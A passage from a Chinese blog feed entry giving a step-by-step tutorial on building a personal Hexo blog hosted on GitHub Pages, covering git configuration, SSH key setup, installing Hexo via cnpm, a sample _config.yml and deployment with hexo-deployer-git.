class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;user_name&quot; # user_name填入GitHub用户名</span><br><span class="line">git config --global user.email &quot;user_email&quot; # user_email填入GitHub注册的邮箱</span><br></pre></td></tr></table></figure><p>然后我们查看已设置的用户名和邮箱，能看到就说明设置成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/10/QRzEtF7N5smLBWv.png" alt="image.png"></p><h2 id="第三步：GitHub创建仓库及配置SSH-key"><a href="#第三步：GitHub创建仓库及配置SSH-key" class="headerlink" title="第三步：GitHub创建仓库及配置SSH key"></a>第三步：GitHub创建仓库及配置SSH key</h2><p>登录github后选择右上角+号，选择new repository，用户名必须为:<strong>你的用户名.github.io</strong>，这里必须注意，否则后面会出问题，那么将来你的网站首页地址就是：https://你的用户名.github.io了，就像下图这样(我的肯定是已注册）</p><p><img src="https://i.loli.net/2021/07/10/H4X37Lcn1hb2ElO.png" alt="image.png"></p><p>打开Git Bash，在里面输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;user.email&quot; # user.email为GitHub上注册的邮箱</span><br></pre></td></tr></table></figure><p>然后直接三个回车即可，默认不需要设置密码，当然你要设也可以，只是要记住，以后部署博客的时候需要用的，我觉得没太大必要，然后去用户主目录看有没有ssh密钥，就在这里面，如下图，将里面id_rsa.pub文件内容全部复制下来，注意看不要多了空格，换行符等等，id_rsa.pub是公钥，可以告诉他人，而id_rsa是私钥就不能泄露了，然后打开github设置密钥界面：<a href="https://github.com/settings/keys">https://github.com/settings/keys</a>，点击<code>New SSH key</code>,tiitle为标题可以随便取，然后内容为刚刚复制的id_rsa.pub公钥复制进去即可，最后点击<code>Add SSH key</code></p><p><img src="https://i.loli.net/2021/07/10/fIt52ZSewEAaJuV.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/29/FWX5u2LzfBlbnY9.png" alt="image.png"></p><p>然后我们在Git Bash中验证是否连接成功，输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>这里面需要注意的是，第一次输入的时候它会问你yes/no，你得输入yes后再回车，不能直接回车，然后显示出下图这个页面说明连接成功：</p><p><img src="https://i.loli.net/2021/07/10/dymWaeJu1Cl7SvP.png" alt="image.png"></p><h2 id="第四步：安装hexo"><a href="#第四步：安装hexo" class="headerlink" title="第四步：安装hexo"></a>第四步：安装hexo</h2><p><code>Hexo</code> 是一个简单、快速、强大的基于 <code>Github Pages</code> 的博客框架，支持 <code>Markdown</code> 格式，有众多优秀插件和主题。</p><p>然后我们就安装hexo，在Git Bash中操作哈，别用cmd，网上很多说直接用<code>$ npm install -g hexo-cli</code>直接安装的，我试了试一直不行，也不知道为什么，所以说我就先安装cnpm，这里我用的是淘宝的镜像源，如果错误就重来，因为连接可能不稳定，失败了多试几次就可以了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">cnpm -v   #如果显示cnpm的版本信息就说明安装成功</span><br><span class="line">cnpm install -g hexo-cli   #安装 hexo（如果失败重新来过)</span><br><span class="line">hexo -v   #返回 hexo 的版本信息</span><br></pre></td></tr></table></figure><p>如果这里显示出了hexo的版本信息，就说明安装成功了，然后我们在电脑中随便找一个地方，建立一个空文件夹，以后你博客的所有东西就都在这里面操作，进入这个空文件夹，右键，点击Git Bash Here，打开Git Bash终端，然后输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init     #初始化 hexo</span><br><span class="line">ls -l     #查看初始化获得的文件</span><br><span class="line">hexo s    #启动 hexo，本地预览</span><br></pre></td></tr></table></figure><p>然后这里如果都没问题的话，就可以在本地4000端口查看自己的网站了，就是这个网站：<a href="http://localhost:4000/">http://localhost:4000</a></p><h2 id="第五步：将博客部署到GitHub上"><a href="#第五步：将博客部署到GitHub上" class="headerlink" title="第五步：将博客部署到GitHub上"></a>第五步：将博客部署到GitHub上</h2><p>然后我们就需要将我们本地的博客搭到GitHub上去了，首先需要修改配置文件，打开博客文件夹中的配置文件<code>_config.yml</code>，需要进行修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">这里贴一份网上看到的  可以复制替换原来的  但是替换之前最好备份 可能会出错</span><br><span class="line">那要么你就对照着看一下改就好:</span><br><span class="line"># Hexo Configuration</span><br><span class="line">## Docs: http://zespia.tw/hexo/docs/configure.html</span><br><span class="line">## Source: https://github.com/tommy351/hexo/</span><br><span class="line"></span><br><span class="line"># Site </span><br><span class="line">title: My Blog #博客名</span><br><span class="line">subtitle: to be continued... #副标题</span><br><span class="line">description: My blog #给搜索引擎看的，对网站的描述，可以自定义</span><br><span class="line">author: Yourname #作者，在博客底部可以看到</span><br><span class="line">email: yourname@yourmail.com #你的联系邮箱</span><br><span class="line">language: zh-CN #中文。如果不填则默认英文</span><br><span class="line"></span><br><span class="line"># URL #这项暂不配置，绑定域名后，欲创建sitemap.xml需要配置该项</span><br><span class="line">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span><br><span class="line">url: http://yoursite.com</span><br><span class="line">root: /</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">tag_dir: tags</span><br><span class="line">archive_dir: archives</span><br><span class="line">category_dir: categories</span><br><span class="line"></span><br><span class="line"># Writing 文章布局、写作格式的定义，不修改</span><br><span class="line">new_post_name: :title.md # File name of new posts</span><br><span class="line">default_layout: post</span><br><span class="line">auto_spacing: false # Add spaces between asian characters and western characters</span><br><span class="line">titlecase: false # Transform title into titlecase</span><br><span class="line">max_open_file: 100</span><br><span class="line">filename_case: 0</span><br><span class="line">highlight:</span><br><span class="line">  enable: true</span><br><span class="line">  backtick_code_block: true</span><br><span class="line">  line_number: true</span><br><span class="line">  tab_replace:</span><br><span class="line"></span><br><span class="line"># Category &amp; Tag</span><br><span class="line">default_category: uncategorized</span><br><span class="line">category_map:</span><br><span class="line">tag_map:</span><br><span class="line"></span><br><span class="line"># Archives 默认值为2，这里都修改为1，相应页面就只会列出标题，而非全文</span><br><span class="line">## 2: Enable pagination</span><br><span class="line">## 1: Disable pagination</span><br><span class="line">## 0: Fully Disable</span><br><span class="line">archive: 1</span><br><span class="line">category: 1</span><br><span class="line">tag: 1</span><br><span class="line"></span><br><span class="line"># Server 不修改</span><br><span class="line">## Hexo uses Connect as a server</span><br><span class="line">## You can customize the logger format as defined in</span><br><span class="line">## http://www.senchalabs.org/connect/logger.html</span><br><span class="line">port: 4000</span><br><span class="line">logger: false</span><br><span class="line">logger_format:</span><br><span class="line"></span><br><span class="line"># Date / Time format 日期格式，可以修改成自己喜欢的格式</span><br><span class="line">## Hexo uses Moment.js to parse and display date</span><br><span class="line">## You can customize the date format as defined in</span><br><span class="line">## http://momentjs.com/docs/#/displaying/format/</span><br><span class="line">date_format: YYYY-M-D</span><br><span class="line">time_format: H:mm:ss</span><br><span class="line"></span><br><span class="line"># Pagination 每页显示文章数，可以自定义，贴主设置的是10</span><br><span class="line">## Set per_page to 0 to disable pagination</span><br><span class="line">per_page: 10</span><br><span class="line">pagination_dir: page</span><br><span class="line"></span><br><span class="line"># Disqus Disqus插件，我们会替换成“多说”，不修改</span><br><span class="line">disqus_shortname:</span><br><span class="line"></span><br><span class="line"># Extensions 这里配置站点所用主题和插件，暂时默认</span><br><span class="line">## Plugins: https://github.com/tommy351/hexo/wiki/Plugins</span><br><span class="line">## Themes: https://github.com/tommy351/hexo/wiki/Themes</span><br><span class="line">theme: landscape</span><br><span class="line">exclude_generator:</span><br><span class="line">plugins:</span><br><span class="line">- hexo-generator-feed</span><br><span class="line">- hexo-generator-sitemap</span><br><span class="line"></span><br><span class="line"># Deployment 站点部署到github要配置(重点！！！)</span><br><span class="line">## Docs: http://zespia.tw/hexo/docs/deploy.html</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: //这里是需要填的，下面会讲</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>然后我们打开Github个人主页的Repository，进入到自己的博客项目，复制项目的SSH码，这里一定要看清楚是复制SSH码哈，<a href="mailto:&#x67;&#x69;&#x74;&#x40;&#103;&#105;&#x74;&#x68;&#x75;&#98;&#x2e;&#99;&#x6f;&#x6d;">&#x67;&#x69;&#x74;&#x40;&#103;&#105;&#x74;&#x68;&#x75;&#98;&#x2e;&#99;&#x6f;&#x6d;</a>开头的，然后粘贴到配置文件最后的repository中，粘贴好后CTRL+S保存即可：</p><p><img src="https://i.loli.net/2021/07/10/QPj8UKGsRDaLBI1.png" alt="image.png"></p><p>然后依次执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean // 清除存缓（不用每次执行）</span><br><span class="line">hexo g     // 修改生成</span><br><span class="line">hexo s     // 修改预览（不用每次执行） </span><br><span class="line">hexo d     // 修改部署</span><br></pre></td></tr></table></figure><p>最后一步<code>hexo d</code>是最重要的，但这里可能会出现<code>ERROR Deployer not found: git</code>报错，这是因为我们没有安装<code>hexo-deployer-git</code>这个插件，但因为安装这个插件需要新建文件夹，而在有的目录下新建文件夹需要管理员权限，这里就需要就在开始菜单输入cmd，并且以管理员身份运行就可，如下图：</p><p><img src="https://i.loli.net/2021/07/10/WvS8ol1GTty5hDL.png" alt="image.png"></p><p>然后执行<code>cnpm install hexo-deployer-git --save</code>安装这个插件，这里还有一个坑，就是必须要在站点目录下执行这句安装<code>hexo-deployer-git</code>的命令，所谓站点目录就是执行<code>hexo init</code>的目录，也就是建立博客的主文件夹，要在里面执行命令才行，如果已经在其他目录安装了<code>hexo-deployer-git</code>插件的小伙伴，可以使用以下命令卸载该插件：<code>cnpm uninstall hexo-deployer-git --save</code>，由于我们是打开的是cmd，所以说要先用<code>cd</code>命令转到站点目录下，然后执行命令安装<code>hexo-deployer-git</code>插件就行啦，然后<code>hexo d</code>就不会报错啦，等一两分钟去看自己博客主页就有东西啦！我们的博客就搭好啦！快往里面放东西吧！</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;hexo-github搭建个人博客的过程及注意事项&quot;&gt;&lt;a href=&quot;#hexo-github搭建个人博客的过程及注意事项&quot; class=&quot;headerlink&quot; title=&quot;hexo+github搭建个人博客的过程及注意事项&quot;&gt;&lt;/a&gt;hexo+github搭建个人博客的过程及注意事项&lt;/h1&gt;&lt;p&gt;前几天刚利用hexo+github搭建好了个人博客，那么这第一篇文章就来写写搭建过程，说不定以后用得到，也希望能给想搭建的朋友提供一些帮助，能少踩一点坑&lt;/p&gt;</summary>
    
    
    
    
    <category term="环境搭建" scheme="https://arsenetang.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
</feed>
